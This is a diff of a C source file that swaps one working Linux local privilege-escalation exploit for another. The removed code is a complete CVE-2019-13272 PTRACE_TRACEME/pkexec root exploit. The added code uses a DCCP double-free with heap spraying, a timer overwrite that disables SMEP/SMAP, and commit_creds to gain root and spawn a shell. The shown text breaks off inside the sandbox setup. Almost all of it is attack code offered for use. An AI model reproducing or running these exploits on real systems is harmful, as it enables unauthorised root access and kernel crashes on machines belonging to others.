@@ -1,390 +1,676 @@
 #define _GNU_SOURCE
-#include <string.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <signal.h>
-#include <stdio.h>
+
+#include <errno.h>
 #include <fcntl.h>
-#include <sched.h>
-#include <stddef.h>
 #include <stdarg.h>
-#include <pwd.h>
-#include <sys/prctl.h>
-#include <sys/wait.h>
-#include <sys/ptrace.h>
-#include <sys/user.h>
+#include <stdbool.h>
+#include <stddef.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#include <sched.h>
+
+#include <sys/socket.h>
 #include <sys/syscall.h>
-#include <sys/stat.h>
-#include <linux/elf.h>
+#include <sys/types.h>
+#include <sys/wait.h>
 
-#define DEBUG
+#include <arpa/inet.h>
+#include <linux/if_packet.h>
+#include <netinet/if_ether.h>
 
-#ifdef DEBUG
-#  define dprintf printf
-#else
-#  define dprintf
-#endif
+#define SMEP_SMAP_BYPASS	1
 
-#define SAFE(expr) ({                   \
-  typeof(expr) __res = (expr);          \
-  if (__res == -1) {                    \
-    dprintf("[-] Error: %s\n", #expr);  \
-    return 0;                           \
-  }                                     \
-  __res;                                \
-})
-#define max(a,b) ((a)>(b) ? (a) : (b))
+// Needed for local root.
+#define COMMIT_CREDS		0xffffffff810a2840L
+#define PREPARE_KERNEL_CRED	0xffffffff810a2c30L
+#define SHINFO_OFFSET		1728
 
-static const char *SHELL = "/bin/bash";
+// Needed for SMEP_SMAP_BYPASS.
+#define NATIVE_WRITE_CR4	0xffffffff81064550ul
+#define CR4_DESIRED_VALUE	0x406e0ul
+#define TIMER_OFFSET		(728 + 48 + 104)
 
-static int middle_success = 1;
-static int block_pipe[2];
-static int self_fd = -1;
-static int dummy_status;
-static const char *helper_path;
-static const char *pkexec_path = "/usr/bin/pkexec";
-static const char *pkaction_path = "/usr/bin/pkaction";
-struct stat st;
+#define KMALLOC_PAD 128
+#define KMALLOC_WARM 32
+#define CATCH_FIRST 6
+#define CATCH_AGAIN 16
+#define CATCH_AGAIN_SMALL 64
 
-const char *helpers[1024];
+// Port is incremented on each use.
+static int port = 11000;
 
-const char *known_helpers[] = {
-  "/usr/lib/gnome-settings-daemon/gsd-backlight-helper",
-  "/usr/lib/gnome-settings-daemon/gsd-wacom-led-helper",
-  "/usr/lib/unity-settings-daemon/usd-backlight-helper",
-  "/usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper",
-  "/usr/sbin/mate-power-backlight-helper",
-  "/usr/bin/xfpm-power-backlight-helper",
-  "/usr/bin/lxqt-backlight_backend",
-  "/usr/libexec/gsd-wacom-led-helper",
-  "/usr/libexec/gsd-wacom-oled-helper",
-  "/usr/libexec/gsd-backlight-helper",
-  "/usr/lib/gsd-backlight-helper",
-  "/usr/lib/gsd-wacom-led-helper",
-  "/usr/lib/gsd-wacom-oled-helper",
+void debug(const char *msg) {
+/*
+	char buffer[32];
+	snprintf(&buffer[0], sizeof(buffer), "echo '%s' > /dev/kmsg\n", msg);
+	system(buffer);
+*/
+}
+
+// * * * * * * * * * * * * * * Kernel structs * * * * * * * * * * * * * * * *
+
+struct ubuf_info {
+	uint64_t callback;		// void (*callback)(struct ubuf_info *, bool)
+	uint64_t ctx;			// void *
+	uint64_t desc;			// unsigned long
 };
 
-/* temporary printf; returned pointer is valid until next tprintf */
-static char *tprintf(char *fmt, ...) {
-  static char buf[10000];
-  va_list ap;
-  va_start(ap, fmt);
-  vsprintf(buf, fmt, ap);
-  va_end(ap);
-  return buf;
+struct skb_shared_info {
+	uint8_t  nr_frags;		// unsigned char
+	uint8_t  tx_flags;		// __u8
+	uint16_t gso_size;		// unsigned short
+	uint16_t gso_segs;		// unsigned short
+	uint16_t gso_type;		// unsigned short
+	uint64_t frag_list;		// struct sk_buff *
+	uint64_t hwtstamps;		// struct skb_shared_hwtstamps
+	uint32_t tskey;			// u32
+	uint32_t ip6_frag_id;		// __be32
+	uint32_t dataref;		// atomic_t
+	uint64_t destructor_arg;	// void *
+	uint8_t  frags[16][17];		// skb_frag_t frags[MAX_SKB_FRAGS];
+};
+
+struct ubuf_info ui;
+
+void init_skb_buffer(char* buffer, void *func) {
+	memset(&buffer[0], 0, 2048);
+
+	struct skb_shared_info *ssi = (struct skb_shared_info *)&buffer[SHINFO_OFFSET];
+
+	ssi->tx_flags = 0xff;
+	ssi->destructor_arg = (uint64_t)&ui;
+	ssi->nr_frags = 0;
+	ssi->frag_list = 0;
+
+	ui.callback = (unsigned long)func;
 }
 
-/*
- * fork, execute pkexec in parent, force parent to trace our child process,
- * execute suid executable (pkexec) in child.
- */
-static int middle_main(void *dummy) {
-  prctl(PR_SET_PDEATHSIG, SIGKILL);
-  pid_t middle = getpid();
+struct timer_list {
+	void		*next;
+	void		*prev;
+	unsigned long	expires;
+	void		(*function)(unsigned long);
+	unsigned long	data;
+	unsigned int	flags;
+	int		slack;
+};
 
-  self_fd = SAFE(open("/proc/self/exe", O_RDONLY));
+void init_timer_buffer(char* buffer, void *func, unsigned long arg) {
+	memset(&buffer[0], 0, 2048);
 
-  pid_t child = SAFE(fork());
-  if (child == 0) {
-    prctl(PR_SET_PDEATHSIG, SIGKILL);
+	struct timer_list* timer = (struct timer_list *)&buffer[TIMER_OFFSET];
 
-    SAFE(dup2(self_fd, 42));
-
-    /* spin until our parent becomes privileged (have to be fast here) */
-    int proc_fd = SAFE(open(tprintf("/proc/%d/status", middle), O_RDONLY));
-    char *needle = tprintf("\nUid:\t%d\t0\t", getuid());
-    while (1) {
-      char buf[1000];
-      ssize_t buflen = SAFE(pread(proc_fd, buf, sizeof(buf)-1, 0));
-      buf[buflen] = '\0';
-      if (strstr(buf, needle)) break;
-    }
-
-    /*
-     * this is where the bug is triggered.
-     * while our parent is in the middle of pkexec, we force it to become our
-     * tracer, with pkexec's creds as ptracer_cred.
-     */
-    SAFE(ptrace(PTRACE_TRACEME, 0, NULL, NULL));
-
-    /*
-     * now we execute a suid executable (pkexec).
-     * Because the ptrace relationship is considered to be privileged,
-     * this is a proper suid execution despite the attached tracer,
-     * not a degraded one.
-     * at the end of execve(), this process receives a SIGTRAP from ptrace.
-     */
-    execl(pkexec_path, basename(pkexec_path), NULL);
-
-    dprintf("[-] execl: Executing suid executable failed");
-    exit(EXIT_FAILURE);
-  }
-
-  SAFE(dup2(self_fd, 0));
-  SAFE(dup2(block_pipe[1], 1));
-
-  /* execute pkexec as current user */
-  struct passwd *pw = getpwuid(getuid());
-  if (pw == NULL) {
-    dprintf("[-] getpwuid: Failed to retrieve username");
-    exit(EXIT_FAILURE);
-  }
-
-  middle_success = 1;
-  execl(pkexec_path, basename(pkexec_path), "--user", pw->pw_name,
-        helper_path,
-        "--help", NULL);
-  middle_success = 0;
-  dprintf("[-] execl: Executing pkexec failed");
-  exit(EXIT_FAILURE);
+	timer->next = 0;
+	timer->prev = 0;
+	timer->expires = 4294943360;
+	timer->function = func;
+	timer->data = arg;
+	timer->flags = 1;
+	timer->slack = -1;
 }
 
-/* ptrace pid and wait for signal */
-static int force_exec_and_wait(pid_t pid, int exec_fd, char *arg0) {
-  struct user_regs_struct regs;
-  struct iovec iov = { .iov_base = &regs, .iov_len = sizeof(regs) };
-  SAFE(ptrace(PTRACE_SYSCALL, pid, 0, NULL));
-  SAFE(waitpid(pid, &dummy_status, 0));
-  SAFE(ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &iov));
+// * * * * * * * * * * * * * * * Trigger * * * * * * * * * * * * * * * * * *
 
-  /* set up indirect arguments */
-  unsigned long scratch_area = (regs.rsp - 0x1000) & ~0xfffUL;
-  struct injected_page {
-    unsigned long argv[2];
-    unsigned long envv[1];
-    char arg0[8];
-    char path[1];
-  } ipage = {
-    .argv = { scratch_area + offsetof(struct injected_page, arg0) }
-  };
-  strcpy(ipage.arg0, arg0);
-  for (int i = 0; i < sizeof(ipage)/sizeof(long); i++) {
-    unsigned long pdata = ((unsigned long *)&ipage)[i];
-    SAFE(ptrace(PTRACE_POKETEXT, pid, scratch_area + i * sizeof(long),
-                (void*)pdata));
-  }
+struct dccp_handle {
+	struct sockaddr_in6 sa;
+	int s1;
+	int s2;
+};
 
-  /* execveat(exec_fd, path, argv, envv, flags) */
-  regs.orig_rax = __NR_execveat;
-  regs.rdi = exec_fd;
-  regs.rsi = scratch_area + offsetof(struct injected_page, path);
-  regs.rdx = scratch_area + offsetof(struct injected_page, argv);
-  regs.r10 = scratch_area + offsetof(struct injected_page, envv);
-  regs.r8 = AT_EMPTY_PATH;
+void dccp_init(struct dccp_handle *handle, int port) {
+	handle->sa.sin6_family = AF_INET6;
+	handle->sa.sin6_port = htons(port);
+	inet_pton(AF_INET6, "::1", &handle->sa.sin6_addr);
+	handle->sa.sin6_flowinfo = 0;
+	handle->sa.sin6_scope_id = 0;
 
-  SAFE(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov));
-  SAFE(ptrace(PTRACE_DETACH, pid, 0, NULL));
-  SAFE(waitpid(pid, &dummy_status, 0));
+	handle->s1 = socket(PF_INET6, SOCK_DCCP, IPPROTO_IP);
+	if (handle->s1 == -1) {
+		perror("socket(SOCK_DCCP)");
+		exit(EXIT_FAILURE);
+	}
+
+	int rv = bind(handle->s1, &handle->sa, sizeof(handle->sa));
+	if (rv != 0) {
+		perror("bind()");
+		exit(EXIT_FAILURE);
+	}
+
+	rv = listen(handle->s1, 0x9);
+	if (rv != 0) {
+		perror("listen()");
+		exit(EXIT_FAILURE);
+	}
+
+	int optval = 8;
+	rv = setsockopt(handle->s1, IPPROTO_IPV6, IPV6_RECVPKTINFO,
+			&optval, sizeof(optval));
+	if (rv != 0) {
+		perror("setsockopt(IPV6_RECVPKTINFO)");
+		exit(EXIT_FAILURE);
+	}
+
+	handle->s2 = socket(PF_INET6, SOCK_DCCP, IPPROTO_IP);
+	if (handle->s1 == -1) {
+		perror("socket(SOCK_DCCP)");
+		exit(EXIT_FAILURE);
+	}
 }
 
-static int middle_stage2(void) {
-  /* our child is hanging in signal delivery from execve()'s SIGTRAP */
-  pid_t child = SAFE(waitpid(-1, &dummy_status, 0));
-  force_exec_and_wait(child, 42, "stage3");
-  return 0;
+void dccp_kmalloc_kfree(struct dccp_handle *handle) {
+	int rv = connect(handle->s2, &handle->sa, sizeof(handle->sa));
+	if (rv != 0) {
+		perror("connect(SOCK_DCCP)");
+		exit(EXIT_FAILURE);
+	}
 }
 
-// * * * * * * * * * * * * * * * * root shell * * * * * * * * * * * * * * * * *
-
-static int spawn_shell(void) {
-  SAFE(setresgid(0, 0, 0));
-  SAFE(setresuid(0, 0, 0));
-  execlp(SHELL, basename(SHELL), NULL);
-  dprintf("[-] execlp: Executing shell %s failed", SHELL);
-  exit(EXIT_FAILURE);
+void dccp_kfree_again(struct dccp_handle *handle) {
+	int rv = shutdown(handle->s1, SHUT_RDWR);
+	if (rv != 0) {
+		perror("shutdown(SOCK_DCCP)");
+		exit(EXIT_FAILURE);
+	}
 }
 
-// * * * * * * * * * * * * * * * * * Detect * * * * * * * * * * * * * * * * * *
-
-static int check_env(void) {
-  const char* xdg_session = getenv("XDG_SESSION_ID");
-
-  dprintf("[.] Checking environment ...\n");
-
-  if (stat(pkexec_path, &st) != 0) {
-    dprintf("[-] Could not find pkexec executable at %s", pkexec_path);
-    exit(EXIT_FAILURE);
-  }
-  if (stat(pkaction_path, &st) != 0) {
-    dprintf("[-] Could not find pkaction executable at %s", pkaction_path);
-    exit(EXIT_FAILURE);
-  }
-  if (xdg_session == NULL) {
-    dprintf("[!] Warning: $XDG_SESSION_ID is not set\n");
-    return 1;
-  }
-  if (system("/bin/loginctl --no-ask-password show-session $XDG_SESSION_ID | /bin/grep Remote=no >>/dev/null 2>>/dev/null") != 0) {
-    dprintf("[!] Warning: Could not find active PolKit agent\n");
-    return 1;
-  }
-  if (stat("/usr/sbin/getsebool", &st) == 0) {
-    if (system("/usr/sbin/getsebool deny_ptrace 2>1 | /bin/grep -q on") == 0) {
-      dprintf("[!] Warning: SELinux deny_ptrace is enabled\n");
-      return 1;
-    }
-  }
-
-  dprintf("[~] Done, looks good\n");
-
-  return 0;
+void dccp_destroy(struct dccp_handle *handle) {
+	close(handle->s1);
+	close(handle->s2);
 }
 
-/*
- * Use pkaction to search PolKit policy actions for viable helper executables.
- * Check each action for allow_active=yes, extract the associated helper path,
- * and check the helper path exists.
- */
-int find_helpers() {
-  char cmd[1024];
-  snprintf(cmd, sizeof(cmd), "%s --verbose", pkaction_path);
-  FILE *fp;
-  fp = popen(cmd, "r");
-  if (fp == NULL) {
-    dprintf("[-] Failed to run: %s\n", cmd);
-    exit(EXIT_FAILURE);
-  }
+// * * * * * * * * * * * * * * Heap spraying * * * * * * * * * * * * * * * * *
 
-  char line[1024];
-  char buffer[2048];
-  int helper_index = 0;
-  int useful_action = 0;
-  static const char *needle = "org.freedesktop.policykit.exec.path -> ";
-  int needle_length = strlen(needle);
+struct udp_fifo_handle {
+	int fds[2];
+};
 
-  while (fgets(line, sizeof(line)-1, fp) != NULL) {
-    /* check the action uses allow_active=yes*/
-    if (strstr(line, "implicit active:")) {
-      if (strstr(line, "yes")) {
-        useful_action = 1;
-      }
-      continue;
-    }
-
-    if (useful_action == 0)
-      continue;
-    useful_action = 0;
-
-    /* extract the helper path */
-    int length = strlen(line);
-    char* found = memmem(&line[0], length, needle, needle_length);
-    if (found == NULL)
-      continue;
-
-    memset(buffer, 0, sizeof(buffer));
-    for (int i = 0; found[needle_length + i] != '\n'; i++) {
-      if (i >= sizeof(buffer)-1)
-        continue;
-      buffer[i] = found[needle_length + i];
-    }
-
-    if (strstr(&buffer[0], "/xf86-video-intel-backlight-helper") != 0 ||
-      strstr(&buffer[0], "/cpugovctl") != 0 ||
-      strstr(&buffer[0], "/package-system-locked") != 0 ||
-      strstr(&buffer[0], "/cddistupgrader") != 0) {
-      dprintf("[.] Ignoring blacklisted helper: %s\n", &buffer[0]);
-      continue;
-    }
-
-    /* check the path exists */
-    if (stat(&buffer[0], &st) != 0)
-      continue;
-
-    helpers[helper_index] = strndup(&buffer[0], strlen(buffer));
-    helper_index++;
-
-    if (helper_index >= sizeof(helpers)/sizeof(helpers[0]))
-      break;
-  }
-
-  pclose(fp);
-  return 0;
+void udp_fifo_init(struct udp_fifo_handle* handle) {
+	int rv = socketpair(AF_LOCAL, SOCK_DGRAM, 0, handle->fds);
+	if (rv != 0) {
+		perror("socketpair()");
+		exit(EXIT_FAILURE);
+	}
 }
 
-// * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * *
-
-int ptrace_traceme_root() {
-  dprintf("[.] Using helper: %s\n", helper_path);
-
-  /*
-   * set up a pipe such that the next write to it will block: packet mode,
-   * limited to one packet
-   */
-  SAFE(pipe2(block_pipe, O_CLOEXEC|O_DIRECT));
-  SAFE(fcntl(block_pipe[0], F_SETPIPE_SZ, 0x1000));
-  char dummy = 0;
-  SAFE(write(block_pipe[1], &dummy, 1));
-
-  /* spawn pkexec in a child, and continue here once our child is in execve() */
-  dprintf("[.] Spawning suid process (%s) ...\n", pkexec_path);
-  static char middle_stack[1024*1024];
-  pid_t midpid = SAFE(clone(middle_main, middle_stack+sizeof(middle_stack),
-                            CLONE_VM|CLONE_VFORK|SIGCHLD, NULL));
-  if (!middle_success) return 1;
-
-  /*
-   * wait for our child to go through both execve() calls (first pkexec, then
-   * the executable permitted by polkit policy).
-   */
-  while (1) {
-    int fd = open(tprintf("/proc/%d/comm", midpid), O_RDONLY);
-    char buf[16];
-    int buflen = SAFE(read(fd, buf, sizeof(buf)-1));
-    buf[buflen] = '\0';
-    *strchrnul(buf, '\n') = '\0';
-    if (strncmp(buf, basename(helper_path), 15) == 0)
-      break;
-    usleep(100000);
-  }
-
-  /*
-   * our child should have gone through both the privileged execve() and the
-   * following execve() here
-   */
-  dprintf("[.] Tracing midpid ...\n");
-  SAFE(ptrace(PTRACE_ATTACH, midpid, 0, NULL));
-  SAFE(waitpid(midpid, &dummy_status, 0));
-  dprintf("[~] Attached to midpid\n");
-
-  force_exec_and_wait(midpid, 0, "stage2");
-  exit(EXIT_SUCCESS);
+void udp_fifo_destroy(struct udp_fifo_handle* handle) {
+	close(handle->fds[0]);
+	close(handle->fds[1]);
 }
 
-int main(int argc, char **argv) {
-  if (strcmp(argv[0], "stage2") == 0)
-    return middle_stage2();
-  if (strcmp(argv[0], "stage3") == 0)
-    return spawn_shell();
+void udp_fifo_kmalloc(struct udp_fifo_handle* handle, char *buffer) {
+	int rv = send(handle->fds[0], buffer, 1536, 0);
+	if (rv != 1536) {
+		perror("send()");
+		exit(EXIT_FAILURE);
+	}
+}
 
-  dprintf("Linux 4.10 < 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)\n");
+void udp_fifo_kmalloc_small(struct udp_fifo_handle* handle) {
+	char buffer[128];
+	int rv = send(handle->fds[0], &buffer[0], 128, 0);
+	if (rv != 128) {
+		perror("send()");
+		exit(EXIT_FAILURE);
+	}
+}
 
-  check_env();
+void udp_fifo_kfree(struct udp_fifo_handle* handle) {
+  	char buffer[2048];
+	int rv = recv(handle->fds[1], &buffer[0], 1536, 0);
+	if (rv != 1536) {
+		perror("recv()");
+		exit(EXIT_FAILURE);
+	}
+}
 
-  if (argc > 1 && strcmp(argv[1], "check") == 0) {
-    exit(0);
-  }
+int timer_kmalloc() {
+	int s = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
+	if (s == -1) {
+		perror("socket(SOCK_DGRAM)");
+		exit(EXIT_FAILURE);
+	}
+	return s;
+}
 
-  /* Search for known helpers defined in 'known_helpers' array */
-  dprintf("[.] Searching for known helpers ...\n");
-  for (int i=0; i<sizeof(known_helpers)/sizeof(known_helpers[0]); i++) {
-    if (stat(known_helpers[i], &st) == 0) {
-      helper_path = known_helpers[i];
-      dprintf("[~] Found known helper: %s\n", helper_path);
-      ptrace_traceme_root();
-    }
-  }
+#define CONF_RING_FRAMES 1
+void timer_schedule(int handle, int timeout) {
+	int optval = TPACKET_V3;
+	int rv = setsockopt(handle, SOL_PACKET, PACKET_VERSION,
+			&optval, sizeof(optval));
+	if (rv != 0) {
+		perror("setsockopt(PACKET_VERSION)");
+		exit(EXIT_FAILURE);
+	}
+	struct tpacket_req3 tp;
+	memset(&tp, 0, sizeof(tp));
+	tp.tp_block_size = CONF_RING_FRAMES * getpagesize();
+	tp.tp_block_nr = 1;
+	tp.tp_frame_size = getpagesize();
+	tp.tp_frame_nr = CONF_RING_FRAMES;
+	tp.tp_retire_blk_tov = timeout;
+	rv = setsockopt(handle, SOL_PACKET, PACKET_RX_RING,
+			(void *)&tp, sizeof(tp));
+	if (rv != 0) {
+		perror("setsockopt(PACKET_RX_RING)");
+		exit(EXIT_FAILURE);
+	}
+}
 
-  /* Search polkit policies for helper executables */
-  dprintf("[.] Searching for useful helpers ...\n");
-  find_helpers();
-  for (int i=0; i<sizeof(helpers)/sizeof(helpers[0]); i++) {
-    if (helpers[i] == NULL)
-      break;
+void socket_sendmmsg(int sock, char *buffer) {
+	struct mmsghdr msg[1];
 
-    if (stat(helpers[i], &st) == 0) {
-      helper_path = helpers[i];
-      ptrace_traceme_root();
-    }
-  }
+	msg[0].msg_hdr.msg_iovlen = 0;
 
-  return 0;
+	// Buffer to kmalloc.
+	msg[0].msg_hdr.msg_control = &buffer[0];
+	msg[0].msg_hdr.msg_controllen = 2048;
+
+	// Make sendmmsg exit easy with EINVAL.
+	msg[0].msg_hdr.msg_name = "root";
+	msg[0].msg_hdr.msg_namelen = 1;
+
+	int rv = syscall(__NR_sendmmsg, sock, msg, 1, 0);
+	if (rv == -1 && errno != EINVAL) {
+		perror("[-] sendmmsg()");
+		exit(EXIT_FAILURE);
+	}
+}
+
+void sendmmsg_kmalloc_kfree(int port, char *buffer) {
+	int sock[2];
+
+	int rv = socketpair(AF_LOCAL, SOCK_DGRAM, 0, sock);
+	if (rv != 0) {
+		perror("socketpair()");
+		exit(EXIT_FAILURE);
+	}
+
+	socket_sendmmsg(sock[0], buffer);
+
+	close(sock[0]);
+}
+
+// * * * * * * * * * * * * * * Heap warming * * * * * * * * * * * * * * * * *
+
+void dccp_connect_pad(struct dccp_handle *handle, int port) {
+	handle->sa.sin6_family = AF_INET6;
+	handle->sa.sin6_port = htons(port);
+	inet_pton(AF_INET6, "::1", &handle->sa.sin6_addr);
+	handle->sa.sin6_flowinfo = 0;
+	handle->sa.sin6_scope_id = 0;
+
+	handle->s1 = socket(PF_INET6, SOCK_DCCP, IPPROTO_IP);
+	if (handle->s1 == -1) {
+		perror("socket(SOCK_DCCP)");
+		exit(EXIT_FAILURE);
+	}
+
+	int rv = bind(handle->s1, &handle->sa, sizeof(handle->sa));
+	if (rv != 0) {
+		perror("bind()");
+		exit(EXIT_FAILURE);
+	}
+
+	rv = listen(handle->s1, 0x9);
+	if (rv != 0) {
+		perror("listen()");
+		exit(EXIT_FAILURE);
+	}
+
+	handle->s2 = socket(PF_INET6, SOCK_DCCP, IPPROTO_IP);
+	if (handle->s1 == -1) {
+		perror("socket(SOCK_DCCP)");
+		exit(EXIT_FAILURE);
+	}
+
+	rv = connect(handle->s2, &handle->sa, sizeof(handle->sa));
+	if (rv != 0) {
+		perror("connect(SOCK_DCCP)");
+		exit(EXIT_FAILURE);
+	}
+}
+
+void dccp_kmalloc_pad() {
+	int i;
+	struct dccp_handle handle;
+	for (i = 0; i < 4; i++) {
+		dccp_connect_pad(&handle, port++);
+	}
+}
+
+void timer_kmalloc_pad() {
+	int i;
+	for (i = 0; i < 4; i++) {
+		socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
+	}
+}
+
+void udp_kmalloc_pad() {
+	int i, j;
+	char dummy[2048];
+	struct udp_fifo_handle uh[16];
+	for (i = 0; i < KMALLOC_PAD / 16; i++) {
+		udp_fifo_init(&uh[i]);
+		for (j = 0; j < 16; j++)
+			udp_fifo_kmalloc(&uh[i], &dummy[0]);
+	}
+}
+
+void kmalloc_pad() {
+	debug("dccp kmalloc pad");
+	dccp_kmalloc_pad();
+	debug("timer kmalloc pad");
+	timer_kmalloc_pad();
+	debug("udp kmalloc pad");
+	udp_kmalloc_pad();
+}
+
+void udp_kmalloc_warm() {
+	int i, j;
+	char dummy[2048];
+	struct udp_fifo_handle uh[16];
+	for (i = 0; i < KMALLOC_WARM / 16; i++) {
+		udp_fifo_init(&uh[i]);
+		for (j = 0; j < 16; j++)
+			udp_fifo_kmalloc(&uh[i], &dummy[0]);
+	}
+	for (i = 0; i < KMALLOC_WARM / 16; i++) {
+		for (j = 0; j < 16; j++)
+			udp_fifo_kfree(&uh[i]);
+	}
+}
+
+void kmalloc_warm() {
+	udp_kmalloc_warm();
+}
+
+// * * * * * * * * * * * * * Disabling SMEP/SMAP * * * * * * * * * * * * * * *
+
+// Executes func(arg) from interrupt context multiple times.
+void kernel_exec_irq(void *func, unsigned long arg) {
+	int i;
+	struct dccp_handle dh;
+	struct udp_fifo_handle uh1, uh2, uh3, uh4;
+	char dummy[2048];
+	char buffer[2048];
+
+	printf("[.] scheduling %p(%p)\n", func, (void *)arg);
+
+	memset(&dummy[0], 0xc3, 2048);
+	init_timer_buffer(&buffer[0], func, arg);
+
+	udp_fifo_init(&uh1);
+	udp_fifo_init(&uh2);
+	udp_fifo_init(&uh3);
+	udp_fifo_init(&uh4);
+
+	debug("kmalloc pad");
+	kmalloc_pad();
+
+	debug("kmalloc warm");
+	kmalloc_warm();
+
+	debug("dccp init");
+	dccp_init(&dh, port++);
+
+	debug("dccp kmalloc kfree");
+	dccp_kmalloc_kfree(&dh);
+
+	debug("catch 1");
+	for (i = 0; i < CATCH_FIRST; i++)
+		udp_fifo_kmalloc(&uh1, &dummy[0]);
+
+	debug("dccp kfree again");
+	dccp_kfree_again(&dh);
+
+	debug("catch 2");
+	for (i = 0; i < CATCH_FIRST; i++)
+		udp_fifo_kmalloc(&uh2, &dummy[0]);
+
+	int timers[CATCH_FIRST];
+	debug("catch 1 -> timer");
+	for (i = 0; i < CATCH_FIRST; i++) {
+		udp_fifo_kfree(&uh1);
+		timers[i] = timer_kmalloc();
+	}
+
+	debug("catch 1 small");
+	for (i = 0; i < CATCH_AGAIN_SMALL; i++)
+		udp_fifo_kmalloc_small(&uh4);
+
+	debug("schedule timers");
+	for (i = 0; i < CATCH_FIRST; i++)
+		timer_schedule(timers[i], 500);
+
+	debug("catch 2 -> overwrite timers");
+	for (i = 0; i < CATCH_FIRST; i++) {
+		udp_fifo_kfree(&uh2);
+		udp_fifo_kmalloc(&uh3, &buffer[0]);
+	}
+
+	debug("catch 2 small");
+	for (i = 0; i < CATCH_AGAIN_SMALL; i++)
+		udp_fifo_kmalloc_small(&uh4);
+
+	printf("[.] waiting for the timer to execute\n");
+
+	debug("wait");
+	sleep(1);
+
+	printf("[.] done\n");
+}
+
+void disable_smep_smap() {
+	printf("[.] disabling SMEP & SMAP\n");
+	kernel_exec_irq((void *)NATIVE_WRITE_CR4, CR4_DESIRED_VALUE);
+	printf("[.] SMEP & SMAP should be off now\n");
+}
+
+// * * * * * * * * * * * * * * * Getting root * * * * * * * * * * * * * * * * *
+
+// Executes func() from process context.
+void kernel_exec(void *func) {
+	int i;
+	struct dccp_handle dh;
+	struct udp_fifo_handle uh1, uh2, uh3;
+	char dummy[2048];
+	char buffer[2048];
+
+	printf("[.] executing %p\n", func);
+
+	memset(&dummy[0], 0, 2048);
+	init_skb_buffer(&buffer[0], func);
+
+	udp_fifo_init(&uh1);
+	udp_fifo_init(&uh2);
+	udp_fifo_init(&uh3);
+
+	debug("kmalloc pad");
+	kmalloc_pad();
+
+	debug("kmalloc warm");
+	kmalloc_warm();
+
+	debug("dccp init");
+	dccp_init(&dh, port++);
+
+	debug("dccp kmalloc kfree");
+	dccp_kmalloc_kfree(&dh);
+
+	debug("catch 1");
+	for (i = 0; i < CATCH_FIRST; i++)
+		udp_fifo_kmalloc(&uh1, &dummy[0]);
+
+	debug("dccp kfree again:");
+	dccp_kfree_again(&dh);
+
+	debug("catch 2");
+	for (i = 0; i < CATCH_FIRST; i++)
+		udp_fifo_kmalloc(&uh2, &dummy[0]);
+
+	debug("catch 1 -> overwrite");
+	for (i = 0; i < CATCH_FIRST; i++) {
+		udp_fifo_kfree(&uh1);
+		sendmmsg_kmalloc_kfree(port++, &buffer[0]);
+	}
+	debug("catch 2 -> free & trigger");
+	for (i = 0; i < CATCH_FIRST; i++)
+		udp_fifo_kfree(&uh2);
+
+	debug("catch 1 & 2");
+	for (i = 0; i < CATCH_AGAIN; i++)
+		udp_fifo_kmalloc(&uh3, &dummy[0]);
+
+	printf("[.] done\n");
+}
+
+typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
+typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
+
+_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
+_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;
+
+void get_root_payload(void) {
+	commit_creds(prepare_kernel_cred(0));
+}
+
+void get_root() {
+	printf("[.] getting root\n");
+	kernel_exec(&get_root_payload);
+	printf("[.] should be root now\n");
+}
+
+// * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * * *
+
+void exec_shell() {
+	char *shell = "/bin/bash";
+	char *args[] = {shell, "-i", NULL};
+	execve(shell, args, NULL);
+}
+
+void fork_shell() {
+	pid_t rv;
+
+	rv = fork();
+	if (rv == -1) {
+		perror("fork()");
+		exit(EXIT_FAILURE);
+	}
+
+	if (rv == 0) {
+		exec_shell();
+	}
+}
+
+bool is_root() {
+	// We can't simple check uid, since we're running inside a namespace
+	// with uid set to 0. Try opening /etc/shadow instead.
+	int fd = open("/etc/shadow", O_RDONLY);
+	if (fd == -1)
+		return false;
+	close(fd);
+	return true;
+}
+
+void check_root() {
+	printf("[.] checking if we got root\n");
+
+	if (!is_root()) {
+		printf("[-] something went wrong =(\n");
+		printf("[!] don't kill the exploit binary, the kernel will crash\n");
+		return;
+	}
+
+	printf("[+] got r00t ^_^\n");
+	printf("[!] don't kill the exploit binary, the kernel will crash\n");
+
+	// Fork and exec instead of just doing the exec to avoid freeing
+	// skbuffs and prevent crashes due to a allocator corruption.
+	fork_shell();
+}
+
+static bool write_file(const char* file, const char* what, ...)
+{
+	char buf[1024];
+	va_list args;
+	va_start(args, what);
+	vsnprintf(buf, sizeof(buf), what, args);
+	va_end(args);
+	buf[sizeof(buf) - 1] = 0;
+	int len = strlen(buf);
+
+	int fd = open(file, O_WRONLY | O_CLOEXEC);
+	if (fd == -1)
+		return false;
+	if (write(fd, buf, len) != len) {
+		close(fd);
+		return false;
+	}
+	close(fd);
+	return true;
+}
+
+void setup_sandbox() {
+	int real_uid = getuid();
+	int real_gid = getgid();
+
+        if (unshare(CLONE_NEWUSER) != 0) {
+		perror("unshare(CLONE_NEWUSER)");
+		exit(EXIT_FAILURE);
+	}
+
+        if (unshare(CLONE_NEWNET) != 0) {
+		perror("unshare(CLONE_NEWUSER)");
+		exit(EXIT_FAILURE);
+	}
+
+	if (!write_file("/proc/self/setgroups", "deny")) {
+		perror("write_file(/proc/self/set_groups)");
+		exit(EXIT_FAILURE);
+	}
+	if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)){
+		perror("write_file(/proc/self/uid_map)");
+		exit(EXIT_FAILURE);
+	}
+	if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
+		perror("write_file(/proc/self/gid_map)");
+		exit(EXIT_FAILURE);
+	}
+
+	cpu_set_t my_set;
+	CPU_ZERO(&my_set);
+	CPU_SET(0, &my_set);
